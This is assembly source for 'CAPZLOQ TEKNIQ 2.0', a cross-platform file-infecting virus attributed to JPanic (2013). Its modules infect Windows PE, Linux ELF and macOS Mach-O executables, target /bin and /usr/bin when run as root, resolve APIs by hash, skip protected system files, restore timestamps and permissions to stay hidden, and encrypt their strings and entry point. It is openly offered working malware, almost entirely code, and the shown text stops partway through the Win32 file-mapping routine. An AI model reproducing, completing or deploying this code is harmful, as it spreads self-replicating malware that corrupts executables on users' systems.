[-------------------------------- vmain.asm --------------------------------]
;= Virus Main Procedure (c) 2013 JPanic ===================================
;
; The main virus routine.
;
; PUBLICS:
;	VMain()
;	dwOrigEIP	DWORD
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat

_VMAIN_ASM	EQU 	TRUE

include inc\win32.inc
include inc\short.inc
include inc\stack.inc
include inc\elf.inc
include inc\macho.inc
include vmain.ash
include osprocs.ash
include inf-pe.ash
include inf-elf.ash
include inf-macho.ash
include rand.ash
	
;= Code Warez =============================================================
        include codeseg.ash
;= VMain ==================================================================
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC VMain
VMain			PROC
			
			push	eax
			pushf
			pushad
			cld
			call	@@delta
		@@delta:pop	esi
			sub	esp,size _VirusHeap
			lea	ebp,[esp+7Fh]			
			sub	esi,(ofs @@delta - ofs VMain)
			mov	[vheap.dwVirusDelta],esi
			mov	ecx,vsize
			mov	[vheap.dwVirusSize],ecx
			or	edx,-1
		@@ByteLoop:	lodsb
				mov	ah,8
				xor	dl,al
			@@BitLoop:	
				shr	edx,1
				.if     carry?
					xor	edx,0EDB88320h
				.endif
				dec	ah
				jnz	@@BitLoop			
			loop	@@ByteLoop				
			xchg	edx,eax			
			lea	edi,[vheap.dwRandSeed]
			stosd
			xchg	eax,ecx
			stosd
			stosd
			stosd
			stosd
			stosd
			mov	al,'.'
			stosd
			call	Fill_Proc_Table
			call	dwo [vheap.dwVInit]
			jb	@@exit
			; Infect "."
			call	InfectDir$NoChdir
			; Infect System Dir's if ROOT.
			call	SetupDirRegs
			lea	edi,[vheap.dwDirCWD]
			call	dwo [vheap.dwVDirSetup]
			mov	eax,[vheap.dwEUID]
			test	eax,eax				; root user only
			jnz	@@exit
			cmp	dwo [vheap.dwDirCWD],eax	; make sure we have current dir.
			je	@@exit
			mov	ebx,[vheap.dwDirA]
			call	InfectDir
			mov	ebx,[vheap.dwDirB]
			call	InfectDir
			mov	ebx,[vheap.dwDirCWD]
			call	[vheap.dwVChdir]
		@@exit: lea	esi,[vheap.dwDirCWD]
			call	dwo [vheap.dwVExit]
			; Compute EIP
			mov 	eax,1BADDEEDh
			org	$-4
			dwEIPEkey dd 1
			mov	ecx,eax
			@@solve_inv:				
				mov	ebx,eax
				imul	ecx
				dec	eax
				jz	@@eip_calculated
				add	eax,ebx
				jmp	@@solve_inv
			@@eip_calculated:	
				;mov	eax,ebx
			; ebx = mulinv (decryption key)
			imul	ebx,ebx,1BADD00Dh
			org	$-4
			dwCryptEIP dd offset VHost
			lea	esp,[ebp + size _VirusHeap - 07Fh]
			mov	[esp.dwRET],ebx
			popad
			popf
			ret			
VMain			ENDP

;--------------------------------------------------------------------------
InfectDir		PROC
; ebx = target dir.
			test	ebx,ebx
			jz	@@exit
			call	dwo [vheap.dwVChdir]
			jb	@@exit
InfectDir$NoChdir:	and	dwo [vheap.dwFindHandle],0
			call	dwo [vheap.dwVFindFirst]			
		@@FindLoop:	jc	@@FindDone
				mov	[vheap.dwFileSize],ecx
				jecxz	@@FindNext
				;bsr   eax,ecx
				db      0Fh,0BDh,0C1h
				cmp	al,12		; 4k min
				jb	@@FindNext
				cmp	al,23		; 8mb max
				jae	@@FindNext
				and	dwo [vheap.dwSavedFMode],0
				call	dwo [vheap.dwVOpenFile]
				jc	@@FindNext
				xchg	eax,ebx
					call	IsImagePE
					jne	@@ci1
					call	InfectPE
					jmp	@@close
				@@ci1:	cmp	dwo [ebx],ELF_MAGIC
					jne	@@ci2
					call	InfectELF
					jmp	@@close
				@@ci2:  cmp	dwo [ebx],mach_MH_MAGIC
					jne	@@ci3
					call	InfectMACHO
					jmp	@@close
				@@ci3:  cmp	dwo [ebx],FAT_CIGAM
					jne	@@close
					call	InfectFAT
			@@close:call	dwo [vheap.dwVCloseFile]
			@@FindNext:
				call	dwo [vheap.dwVFindNext]
				jmp	@@FindLoop
			@@FindDone:
			call	dwo [vheap.dwVFindClose]
		@@exit:	ret
InfectDir		ENDP

;--------------------------------------------------------------------------
extrn txt1:WORD
extrn txt2:WORD

PUBLIC BuildVBody
BuildVBody              PROC
			push	ebx
                        ; Copy virus, Set dwOrigEIP=eax, OS_Proc_Switch=dl                        
			push	edi             ; Save new virus body offset.            
			mov	ecx,[vheap.dwVirusSize]
			mov	esi,dwo [vheap.dwVirusDelta]
			rep	movsb
			pop	ebx             ; EBX = virus body
			; Correct Virus Image.			
			mov	by [(ebx-VCode).OS_Proc_Switch],dl
			; Crypt/Set EIP
			xchg	eax,edx
			call	GetRand32
			or	al,1
			mov	dwo [(ebx-VCode).dwEIPEkey],eax
			mul	edx
			mov	dwo [(ebx-VCode).dwCryptEIP],eax			
			;Encrypt Text Strings
			call	@@skiptxttable
				dd	(offset txt0 - VCode)
				org	$-2
				dd	(offset txt1 - VCode)
				org	$-2
				dd	(offset txt2 - VCode)
				org	$-2		
			@@skiptxttable:			
			pop	esi
			pushad
			push	3
			pop	ecx
			@@stringloop:
				call	GetRand32
				xchg	eax,edx				
				xor	eax,eax
				lodsw				
				pushad
				lea	esi,[eax+ebx]
				xor	eax,eax
				lodsw
				xchg	ecx,eax
				mov	edi,esi
				@@charloop:
					lodsb
					xor	al,dl					
					stosb
					loop	@@charloop			
				popad
			loop	@@stringloop
			popad
			pop	ebx
			ret
BuildVBody              ENDP

;--------------------------------------------------------------------------
; ECX = "."
; ESI = DirA
; EDX = DirB
PUBLIC SetupDirRegs
SetupDirRegs		PROC

			lea	ecx,[vheap.dwDOT]
			call	@@skip1
				ifdef DEADLY
					db "/bin",0
				else
					db "/testa",0
				endif
		@@skip1:pop	esi
			call	@@skip2
				ifdef DEADLY
					db "/usr/bin",0
				else
					db "/testb",0
				endif
		@@skip2:pop	edx
			ret
SetupDirRegs		ENDP

txt0	dw	(ofs txt0e - txt0s)
txt0s:	db      VName," (c) 2013 JPanic, Australia.",0
txt0e:

;==========================================================================
                        ENDS
			END	VMain
;==========================================================================

[-------------------------------- vmain.asm --------------------------------]
[-------------------------------- vmain.ash --------------------------------]
;= Virus Main Declarations (c) 2013 JPanic ================================
;
; Declarations:
;	VMain()
;	BuildVBody()
;	SetupDirRegs()
;	VHost()
;
; Defines:
;	VCode
;	VSize
;	VMarker
;	VName
;
;- Directive Warez --------------------------------------------------------
		.486

include vheap.ash

;- Public Declarations ----------------------------------------------------
IFNDEF	_VMAIN_ASM
	extrn	VMain:PROC	
        extrn   BuildVBody:PROC
	extrn	SetupDirRegs:PROC
ENDIF	;_VMAIN_ASM

IFNDEF	_VHOST_ASM
	extrn	VHost:PROC
ENDIF	;_VHOST_ASM

;- Virus Code Base --------------------------------------------------------
VCode	EQU	(VBase + 1000h)

;- Virus Size -------------------------------------------------------------
vsize	EQU     (ofs VHost - VCode)

ASCII_VSIZE	EQU	db "2874"

;- Virus Marker -----------------------------------------------------------
VMarker	EQU	7DFBh

;- Virus Name -------------------------------------------------------------
VName 	EQU	"[CAPZLOQ TEKNIQ 2.0]"

;==========================================================================
[-------------------------------- vmain.ash --------------------------------]
[-------------------------------- vheap.ash --------------------------------]
;= Virus Heap Structure Definition (c) 2013 JPanic ========================
;
; Defines structure of virus heap and addressing shortcuts.
;
; General Layout:
; 	VirusDelta, FileHandle, FileSize, FileMappedImage,
;	OS_Proc_Table,
;	UNION {
;		Win32Heap
;		LinuxHeap
;               OSXHeap
;	}
;
;- Directive Warez --------------------------------------------------------
include inc\win32.inc
include inc\linux.inc
include inc\osx.inc
include inc\elf.inc
include inc\short.inc
include win32imps.ash
include osprocs.ash

		.486
		
;- Short Cuts -------------------------------------------------------------
vheap		EQU	(ebp-7Fh)
Win32Heap	EQU	(vheap._Win32Heap)
LinuxHeap	EQU	(vheap._LinuxHeap)
OSXHeap         EQU     (vheap._OSXHeap)

;- Win32 Heap -------------------------------------------------------------
TWin32Heap			STRUC	
	dwSfcIsFileProtected	dd	?
	dwMapHandle		dd	?
	W32_IMP_LIST		<<dw!&_impname!& dd ?>>	
	WFF_Entry		WFF	<>
TWin32Heap			ENDS

Win32ProcAddr			=	(dwMapHandle + size dwMapHandle)
LastWin32ProcAddr               =       (Win32ProcAddr + (K32ProcCount * 4) - 4)

;- Linux Heap -------------------------------------------------------------
TLinuxHeap			STRUC	
	statbuf			stat	<>
        dirp			dirent	<>	
TLinuxHeap                      ENDS

; - OSX Heap --------------------------------------------------------------
TOSXHeap                        STRUC
        osx$maxdirbufptr	dd	?
	osx$curdirbufptr	dd	?
        osx$statbuf             osx$stat        <>        
	osx$dirbasep		dq	?
TOSXHeap                        ENDS

;- Complete Virus Heap ----------------------------------------------------
_VirusHeap			STRUC
	dwVirusDelta		dd	?
	dwVirusSize		dd	?
	dwFileHandle		dd	?
	dwMappedSize		dd	?
	dwMappedFile		dd	?
	dwFileSize		dd	?
	dwSavedFMode		dd	?
        dwFindHandle            dd      ?
	dwRandSeed		dd	?	; STOSD from here.	
	dwDirCWD		dd	?	; 0
	dwDirA			dd	?	; 0 
	dwDirB			dd	?	; 0 
        dwBigBuf		dd	?	; 0
	dwEUID                  dd      ?	; 0	
	dwDOT			dd	?	; 0x2E
	OS_PROC_LIST		<<dwV!&_procname!& dd ?>>
	UNION
		_Win32Heap		TWin32Heap	<>
		_LinuxHeap		TLinuxHeap	<>
                _OSXHeap                TOSXHeap        <>
	ENDS	
_VirusHeap			ENDS

VProcList		=	(dwDOT + size dwDOT)

;- OS Specific Big Buffers ------------------------------------------------
; Win32
win32$bigbuf			STRUC
	win32$FullPathName	dw 	MAX_PATH dup(?)
	win32$CurrentDir	dw 	MAX_PATH dup(?)
	win32$WindowsDir	dw 	MAX_PATH dup(?)
	win32$SystemDir		dw 	MAX_PATH dup(?)
win32$bigbuf			ENDS
win32$bigbuf_size		=	size win32$bigbuf

;OSX
osx$bigbuf			STRUC
	osx$dirp		db (32 * 1024) dup (?)
				align 1000h
osx$bigbuf			ENDS
osx$bigbuf_size			=	size osx$bigbuf

;==========================================================================
[-------------------------------- vheap.ash --------------------------------]
[-------------------------------- vhost.asm --------------------------------]
;= Virus Host Stub (c) 2013 JPanic ========================================
;
; The host to which the virus returns. Must be linked last.
;
; PUBLICS:
;	VHost()
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat

_VHOST_ASM	EQU 	TRUE

include inc\short.inc
include vmain.ash

extrn MessageBoxA:PROC
extrn ExitProcess:PROC
	
;= Code Warez =============================================================
        include codeseg.ash
;= VHost ==================================================================
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC VHost
VHost			PROC

			push	L 0
			push	ofs szCaption
			push	ofs szMsg
			push	L 0
			call	MessageBoxA
			push	L 0
			call	ExitProcess

VHost			ENDP

;--------------------------------------------------------------------------
        .data
szCaption:	db	VName," VIRUS DROPPER (c) 2013 JPanic",0
szMsg:		db	VName," VIRUS SUCCESFULLY EXECUTED!",0

;==========================================================================
                        ENDS
			END
;==========================================================================

[-------------------------------- vhost.asm --------------------------------]
[------------------------------- codeseg.ash -------------------------------]
        SEGMENT _TEXT1 BYTE PUBLIC USE32 'CODE'
[------------------------------- codeseg.ash -------------------------------]
[------------------------------- osprocs.ash -------------------------------]
;= Process list of OS Specific functions (c) 2013 JPanic ==================
;
; Supported OS Functions:
;	Init, FindFirst, FindNext, FindClose, OpenFile, CloseFile
;
;- Declaration Warez ------------------------------------------------------
IFNDEF _OSPROCS_ASM
	extrn OS_Proc_Switch:BYTE
	extrn Fill_Proc_Table:PROC
ENDIF ;_OSPROCS_ASM

;- OS Procedure Processing Macro ------------------------------------------
OS_PROC_LIST	MACRO	_code		
		IRP	_procname,<Init,FindFirst,FindNext,FindClose,OpenFile,CloseFile,Exit,DirSetup,Chdir>
			IRP	_codeline, <_code>
				&_codeline&
			ENDM
			purge	_codeline
		ENDM
		purge	_procname
ENDM

;- Set OS Proc Count ------------------------------------------------------
OSProcCount	=	0
OS_PROC_LIST	<<OSProcCount = OSProcCount + 1>>

;- Set OS_Proc_Switch Selectors -------------------------------------------
OS_Proc_Use_Win32	=       0
OS_Proc_Use_Linux	=       (OSProcCount * 2)
OS_Proc_Use_OSX		=       OS_Proc_Use_Linux+(OSProcCount * 2)
;==========================================================================
[------------------------------- osprocs.ash--------------------------------]
[------------------------------- osprocs.asm -------------------------------]
;= Implement Tables of OS Specific functions (c) 2013 JPanic ===============
;
; Supported OS Functions:
;	Init, FindFirst, FindNext, FindClose, OpenFile, CloseFile, Exit
;
; Supported OS's:
;	Win32, Linux, OSX.
;
; PUBLICS:
;	dword Win32_Proc_Table[]
;	dword Linux_Proc_Table[]
;	dword OSX_Proc_Table[]
;	dword Cur_Proc_Table
;	Fill_Proc_Table()
;
;- Directive Warez --------------------------------------------------------
_OSPROCS_ASM	EQU 	TRUE

include osprocs.ash
include vheap.ash
include vmain.ash
	
	.486
	.model	flat
	locals @@
	
;= Code Warez =============================================================
        include codeseg.ash
;= Virus Procedure Address Encoding =======================================
VPROC	MACRO	ProcAddr

	extrn &ProcAddr&:PROC
	dd	(offset ProcAddr - VCode)
	org	$-2	
ENDM
	
;= Fill_Proc_Table ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Fill_Proc_Table
PUBLIC  OS_Proc_Switch
Fill_Proc_Table		PROC
			push	L OSProcCount
			pop	ecx
                        call    @@skip
                                ; Win32 List - Offset 0
                                OS_PROC_LIST	<<VPROC Win32_!&_procname!&>>
                                ; Linux List
                                OS_PROC_LIST	<<VPROC Linux_!&_procname!&>>
				; OSX List
                                OS_PROC_LIST	<<VPROC OSX_!&_procname!&>>
        @@skip:         pop     esi
                        add     esi,?
                        org     $-1
        OS_Proc_Switch  db      OS_Proc_Use_Win32
			lea	edi,[vheap.VProcList]
			@@cl:	xor	eax,eax
				lodsw
				add	eax,[vheap.dwVirusDelta]
				stosd
			loop	@@cl
			ret			
Fill_Proc_Table		ENDP

;==========================================================================
                        ENDS
                        END
;==========================================================================

[------------------------------- osprocs.asm -------------------------------]
[----------------------------- linux-procs.asm -----------------------------]
;= Linux Virus Procedure Implementation (c) 2013 JPanic ===================
;
; Provides Virus Operating System specific routines for Linux.
;
; PUBLICS:
;	Linux_Init()
;	Linux_FindFirst()
;	Linux_FindNext()
;	Linux_FindClose()
;	Linux_OpenFile()
;	Linux_Close()
;	Linux_Exit()
;	Linux_DirSetup
;	Linux_Chdir
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat
	
include inc\linux.inc
include inc\short.inc
include vheap.ash

extrn	SetupDirRegs:PROC
	
;= Code Warez =============================================================
        include codeseg.ash

; = Linux_Init ============================================================
;
; Must Clear CF.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_Init
Linux_Init		PROC
			xor	eax,eax
			mov	al,201
			int	80h			; geteuid()
			mov	[vheap.dwEUID],eax
			clc
			ret
Linux_Init		ENDP

; = Linux_Exit ============================================================
; Close DIR fd's.
PUBLIC	Linux_Exit
Linux_Exit		PROC
			;lea	esi,[vheap.dwDirCWD]
			lodsd
			xchg	eax,ebx
			call	$close
			lodsd
			xchg	eax,ebx
			call	$close
			lodsd
			xchg	eax,ebx
			jmp	$close
Linux_Exit		ENDP

;= Linux_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindFirst
Linux_FindFirst		PROC		
			lea	ebx,[vheap.dwDOT]	; const char *fname
			xor	ecx,ecx			; int flags
			push	L 5
			pop	eax
			cdq				; mode_t mode			
			int	80h			; - open(..)			
			cdq
			inc	edx			; 0 on error
			jz	$ret_cf
			mov	dwo [vheap.dwFindHandle],eax			
		$LinuxReadDir:			
			xchg	ebx,eax			; uint fd
			lea	ecx,[LinuxHeap.dirp]	; struct dirent *dirp
			push	L 1
			pop	edx			; count
			push	L 89
			pop	eax
			int	80h			; - readdir(..)
			xchg	eax,ecx
			jecxz	$ret_cf
			lea	ebx,[LinuxHeap.dirp.dirent_name]       ; char *fname			
			push	L 106
			pop	eax
			lea	ecx,[LinuxHeap.statbuf]	        ; struct stat *buf
			int	80h				        ; - stat(..)
			; regular files only
			mov	dx,STAT_MODE_FILETYPE_MASK
			and	edx,dwo [LinuxHeap.statbuf.stat_mode]
			cmp	dx,STAT_MODE_FILETYPE_REG
			jne	Linux_FindNext
			mov	ecx,dwo [LinuxHeap.statbuf.stat_size]
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret
Linux_FindFirst		ENDP

;= Linux_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindNext
Linux_FindNext		PROC
			mov	eax,dwo [vheap.dwFindHandle]
			jmp	$LinuxReadDir			
Linux_FindNext		ENDP

;= Linux_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindClose
Linux_FindClose		PROC
			mov	ebx,dwo [vheap.dwFindHandle]; int fd
	$close:		test	ebx,ebx
			jz	@@ret
			push	L 6
			pop	eax
			int	80h				; - close(..)
		@@ret:	ret			
Linux_FindClose		ENDP

;= Linux_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_OpenFile
Linux_OpenFile		PROC
			;and	dwo [vheap.dwSavedFMode],0
			lea	ebx,[LinuxHeap.dirp.dirent_name]; const char *fname
			movzx	ecx,[LinuxHeap.statbuf.stat_gid]
			cmp	ecx,[vheap.dwEUID]
			jne	@@nochmod
				movzx	ecx,[LinuxHeap.statbuf.stat_mode]
				mov	[vheap.dwSavedFMode],ecx
				or	cx,S_OWNER_R+S_OWNER_W
				push    L 15
				pop	eax
				int	80h		; chmod(..)
		@@nochmod:
			push	L 5
			pop	eax
			lea	ebx,[LinuxHeap.dirp.dirent_name]; const char *fname
			cdq					; mode_t mode			
			lea	ecx,[edx+2]			; int flags.)
			int     80h
                        mov	[vheap.dwFileHandle],eax
			cdq
			xchg	ebx,eax				; int fd
			inc	edx
			jz	$restore_chmod
			; ftruncate(fd,filesize+0x2000)
                        mov     ecx,[vheap.dwFileSize]                        
                        xor     edx,edx
                        mov     dh,30h
                        add     ecx,edx
                        push    L 93                            ; ftruncate
                        pop     eax
                        int     80h
                        mov     dh,10h
                        or      eax,eax
                        jnz     $restore_close                        
			; mmap(NULL, FileSize+4k rounded, PROT_READ+PROT_WRITE, MAP_SHARED, fd, 0)
			push ebp			
			mov	al,192							; mmap2
			mov edi,ebx							; fd
			xor	ebx,ebx							; addr
			;mov esi,L MAP_SHARED				; flags
			push	L MAP_SHARED
			pop	esi
			neg	edx
			and	ecx,edx
			mov	[vheap.dwMappedSize],ecx
			xor	ebp,ebp							; offset			
			;mov edx,L PROT_READ+PROT_WRITE		; prot
			push	L PROT_READ+PROT_WRITE
			pop	edx
			int	80h
			pop ebp
			cmp	eax,-4096
			mov	[vheap.dwMappedFile],eax
			jae	$restore_size
			clc	
			ret
Linux_OpenFile		ENDP

;= Linux_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by Linux_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	Linux_CloseFile
Linux_CloseFile		PROC
			; unmap dwMappedFile, dwFileSize+4096
                        push	L 91
			pop	eax
			mov	ebx,[vheap.dwMappedFile]	; void *start			
                        mov	ecx,dwo [vheap.dwMappedSize]	; size_t length
			int	80h				; - munmap(..)
	$restore_size:	; ftruncate ebx=fd,ecx=dwFillesize
                        mov     ebx,[vheap.dwFileHandle]
                        mov     ecx,[vheap.dwFileSize]
                        push    L 93                            ; ftruncate
                        pop     eax
                        int     80h
	$restore_close:	mov	ebx,[vheap.dwFileHandle]	; int fd
			push	L 6
			pop	eax				; - close(..)
			int	80h
			lea	ebx,[LinuxHeap.dirp.dirent_name]  ; char *fname
			lea	ecx,[LinuxHeap.statbuf.stat_atime]
			push	dwo [ecx+8]
			pop	dwo [ecx+4]
			push	L 30
			pop	eax
			int	80h				; utime(..)
	$restore_chmod:	mov	ecx,[vheap.dwSavedFMode]
			jecxz	@@nochmod
				lea	ebx,[LinuxHeap.dirp.dirent_name]  ; char *fname
				push	L 15
				pop	eax		; chmod(..)
				int	80h
		@@nochmod:
			stc
			ret
Linux_CloseFile		ENDP

;= Linux_Chdir ============================================================
;
; ebx = fd Dir
; returns CF on error.
;
;--------------------------------------------------------------------------
PUBLIC Linux_Chdir
Linux_Chdir		PROC
			xor	eax,eax
			mov	al,133
			int	80h	; fchdir(...)
			shl	eax,1	; CF on error.
			ret
Linux_Chdir		ENDP

;= Linux_DirSetup ========================================================
;
; Outputs:
;	dwCWD, dwDirA, dwDirB
;
;-------------------------------------------------------------------------
PUBLIC	Linux_DirSetup
Linux_DirSetup		PROC
			;lea	edi,[vheap.dwDirCWD]		; edi: dest
			;call	SetupDirRegs
			; ecx = CWD (.), esi = DirA, edx = DirB.
			mov	ebx,ecx
			call	OpenDir
			mov	ebx,esi
			call	OpenDir
			mov	ebx,edx
			;call	OpenDir
			;ret
Linux_DirSetup		ENDP

; ebx = path
OpenDir			PROC
			push	edx
			xor	ecx,ecx			; int flags
			push	L 5
			pop	eax
			cdq				; mode_t mode			
			int	80h			; - open(..)			
			cdq
			inc	edx			; 0 on error
			jnz	@@s
			xchg	eax,edx
		@@s:	stosd
			pop	edx
			ret
OpenDir			ENDP
;==========================================================================
                        ENDS
			END
;==========================================================================

[----------------------------- linux-procs.asm -----------------------------]
[----------------------------- win32-procs.asm -----------------------------]
;= Win32 Virus Procedure Implementation (c) 2013 JPanic ===================
;
; Provides Virus Operating System specific routines for Win32.
;
; PUBLICS:
;	Win32_Init()
;	Win32_FindFirst()
;	Win32_FindNext()
;	Win32_FindClose()
;	Win32_OpenFile()
;	Win32_Close()
;	Win32_Exit()
;	Win32_DirSetup
;	Win32_Chdir
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================

	.486
	locals @@
	.model flat

include inc\win32.inc
include inc\short.inc
include inc\stack.inc
include inc\pe.inc
include inf-pe.ash
include vheap.ash
include	strhash32.ash


	_WIN32PROC_ASM	EQU 	TRUE

;= Code Warez =============================================================
        include codeseg.ash
;= Win32_Init =============================================================
; Outputs:
;	CF on error.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_Init
Win32_Init		PROC

			efp = 0
			mov     ebx,[ebp+(size stPUSHAD)+(size _VirusHeap)-7Fh]
			inc	ebx
	@@k32_search:	dec	ebx
			xor	bx,bx
			call	IsImagePE
			jne	@@k32_search
	@@found_PE:	mov	esi,[esi.peh_ExportDirectory.pedir_VA]
			lea	esi,[esi+ebx.peexp_NameCount]
			lodsd					;peexp_NameCount
			xchg	ecx,eax
			lodsd					;peexp_ProcListPtr
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwProcsVA = -efp
			lodsd					;peexp_NameListPtr
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwNamesVA = -efp
			lodsd					;peexp_OrdinalListPtr
			add	eax,ebx
			push	eax
			efp = efp + 4
			dwOrdsVA = -efp
                        xor	edx,edx
			;mov	[vheap.dwEUID],edx
			push	edx
			efp = efp + 4
			dwProcsFound = -efp
                @@proc_loop:	push	ecx		; peexp_NameCount
				efp = efp + 4
				mov	esi,[esp+efp+dwNamesVA]
				mov	esi,[esi+edx*4]
				add	esi,ebx
				pusha
				efp = efp + (8 * 4)
				call	StringHash32
				call	@@getprocofs
				W32_IMP_LIST	<<strhash32_laz !&_impname!&>, <dd strhash32>>
		                @@getprocofs:
					pop	edi
					push	L K32ProcCount
					pop	ecx
					repne	scasd
                                        .if     zero?
						mov 	esi,[esp+efp+dwOrdsVA]
						movzx	esi,wo [esi+edx*2]
						shl	esi,2
                                                add	esi,[esp+efp+dwProcsVA]
						lodsd
						lea	esi,[ebx+eax]
						neg     ecx
						mov	dwo [Win32Heap.LastWin32ProcAddr+(ecx * 4)],esi
						inc	dwo [esp+efp+dwProcsFound]
                                        .endif
				popa
                                efp = efp - (8 * 4)
				inc	edx
				pop	ecx
				efp = efp - 4
			dec	ecx
			jnz	@@proc_loop
			cmp	dwo [esp+efp.dwProcsFound],K32ProcCount
			lea	esp,[esp+efp]
			purge efp
			jne	@@exit_cf
			db	68h,"sfc",0
			push	esp			; lpFileName
			call	[Win32Heap.dwLoadLibraryA]
			pop	ecx
			xchg	eax,ecx
			jecxz	@@nosfc
			call @@skipsfcname	; lpProcName
				db	"SfcIsFileProtected",0
			@@skipsfcname:
			push	ecx		; hModule
			call	[Win32Heap.dwGetProcAddress]
			xchg	eax,ecx
		@@nosfc:mov	[Win32Heap.dwSfcIsFileProtected],ecx
			push	L win32$bigbuf_size	; dwByes
			push	L 40h			; GPTR
			call	[Win32Heap.dwGlobalAlloc]
			mov	[vheap.dwBigBuf],eax
			xchg	eax,ecx
		@@exit_ecxz_cf$1:
			jecxz	@@exit_cf
		@@exit_nc:
			test	al,1
			org	$-1
		@@exit_cf:
			stc
		@@exit:	ret
Win32_Init		ENDP

;= Win32_Exit =============================================================
PUBLIC	Win32_Exit
Win32_Exit		PROC
			mov	ecx,[vheap.dwBigBuf]
			jecxz	@@no_free
				push	ecx	; hMem
				call	dwo [Win32Heap.dwGlobalFree]
		@@no_free:
			ret
Win32_Exit		ENDP

;= Win32_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindFirst
Win32_FindFirst		PROC

			; FindFirstFileW
			lea	eax,[Win32Heap.WFF_Entry]		; lpFindFileData
			push	eax
			call	@@SkipMask				; lpFileName
			ifdef 	DEADLY
			 dd	'*'
			else
			 dw '*','.','c','l','t','2','0',0		; *.clt20 for testing
			endif
		@@SkipMask:
			call	dwo [Win32Heap.dwFindFirstFileW]	; - FindFirstFileA(..)			
			inc	eax					; INVALID_FILE_HANDLE ?
			jz	$ret_cf
			dec	eax
			mov	[vheap.dwFindHandle],eax
		$Win32_Find:	
			test	[Win32Heap.WFF_Entry.wff_FileAttributes],BAD_FILE_ATTRIBUTES
			jnz	Win32_FindNext
			lea	edi,[Win32Heap.WFF_Entry.wff_FileName]
			mov	esi,[vheap.dwBigBuf]
			push	L NULL			; lpFilePart			
			push	esi			; lpBuffer
			push	L MAX_PATH		; nBufferLength
			push	edi			; lpFileName
			call 	[Win32Heap.dwGetFullPathNameW]
			mov	ecx,[Win32Heap.dwSfcIsFileProtected]
			jecxz	@@nosfc
			push	esi			; lpBuffer
			push	L NULL			; RpcHandle
			call	ecx			; SfcIsFileProtected(...)
			test	eax,eax
			jnz	Win32_FindNext
		@@nosfc:push	L FILE_ATTRIBUTE_NORMAL	; dwFileAttributes			
			push	esi			; lpFileName
			call 	[Win32Heap.dwSetFileAttributesW]
			xchg	eax,ecx
			jecxz	Win32_FindNext
			xor	ecx,ecx
			.if	dwo [Win32Heap.WFF_Entry.wff_FileSizeHigh] == ecx
				mov		ecx,dwo [Win32Heap.WFF_Entry.wff_FileSizeLow]
			.endif
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret

Win32_FindFirst		ENDP

;= Win32_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindNext
Win32_FindNext		PROC

			lea	eax,[Win32Heap.WFF_Entry]
			push	eax				; lpFindFileData
			push	dwo [vheap.dwFindHandle]	; hFindFile
			call	dwo [Win32Heap.dwFindNextFileW]; - FindNextFileA(..)
			test	eax,eax
			jnz	$Win32_Find
			stc
			ret

Win32_FindNext		ENDP

;= Win32_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_FindClose
Win32_FindClose		PROC			
			mov	ecx,[vheap.dwFindHandle]
			jecxz	@@ret
			push	ecx				; hFindFile
			call	dwo [Win32Heap.dwFindClose]	; - FindClose(..)
		@@ret:	ret
Win32_FindClose		ENDP

;= Win32_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	Win32_OpenFile
Win32_OpenFile		PROC

			xor	ecx,ecx
			; CreateFileA
			push	ecx				; hTemplateFile
			push	ecx                             ; dwFlagsAndAttributes
			push	L OPEN_EXISTING			; dwCreationDisposition
			push	ecx				; lpSecurityAttributes
			push	ecx 				; dwShareMode
			push	L (GENERIC_READ + GENERIC_WRITE); dwDesiredAccess
			push	[vheap.dwBigBuf]		; lpFIleName
			call	dwo [Win32Heap.dwCreateFileW]	; - CreateFileA(..)
			mov	[vheap.dwFileHandle],eax
			inc	eax				; INVALID_HANDLE_VALUE ?
			jz	$ret$c
			dec	eax
			xor	ebx,ebx
			mov	bh,20h
			mov	esi,[vheap.dwFileSize]
			add	esi,ebx
			; FileHandle ExtendedSize
			push	eax esi
			; SetFilePointer
			push	L FILE_END			; dwMoveMethod
			push	L NULL				; lpDistanceToMoveHigh
			push	ebx				; lDistanceToMove
			push	eax				; hFile
			call	dwo [Win32Heap.dwSetFilePointer]; - SetFilePointer(..)
			; ExtendedSize
			pop	ecx
			cmp	eax,ecx
			; FileHandle
			pop	eax
			jne	$restore_close
			; FileHandle, ExtendedSize
			push	eax ecx
			; SetEndOfFile
			push	eax				; hFile
			call	dwo [Win32Heap.dwSetEndOfFile]	; - SetEndOfFile(..)
			xchg	eax,ecx
			; ExtendedSize, FileHandle
			pop	edx ebx
			jecxz	$restore_close
			xor	eax,eax
			; CreateFileMappingW
			push	eax				; lpName
			push	eax				; dwMaximumSizeLow
			push	eax				; dwMaximumSizeHigh
			push	L PAGE_READWRITE		; flProtect
			push	eax				; lpFileMappingAttributes
			push	ebx				; hFile
